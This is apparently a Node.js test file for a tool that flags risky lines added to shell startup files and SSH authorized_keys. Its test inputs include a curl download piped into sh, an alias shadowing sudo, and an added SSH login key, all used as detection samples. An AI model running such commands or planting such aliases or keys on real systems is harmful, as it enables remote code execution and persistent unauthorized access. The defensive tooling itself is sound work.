import assert from 'node:assert/strict';
import test from 'node:test';
import { hintsForAddedLines } from '../src/hints.js';

const texts = (label, lines) => hintsForAddedLines(label, lines).map((h) => h.text);

test('flags curl piped to shell', () => {
  assert.ok(texts('~/.zshrc', ['curl -fsSL https://x.test/a.sh | sh']).includes('pipes a download straight into a shell'));
});

test('flags shadowed core commands', () => {
  assert.ok(texts('~/.bashrc', ['alias sudo="evil"']).includes('shadows a core command with an alias'));
});

test('flags authorized_keys additions only in that file', () => {
  assert.ok(texts('~/.ssh/authorized_keys', ['ssh-ed25519 AAAA key']).includes('adds an SSH login key'));
  assert.ok(!texts('~/.zshrc', ['ssh-ed25519 AAAA key']).includes('adds an SSH login key'));
});

test('ignores comments and blank lines', () => {
  assert.deepEqual(texts('~/.zshrc', ['# curl x | sh', '']), []);
});
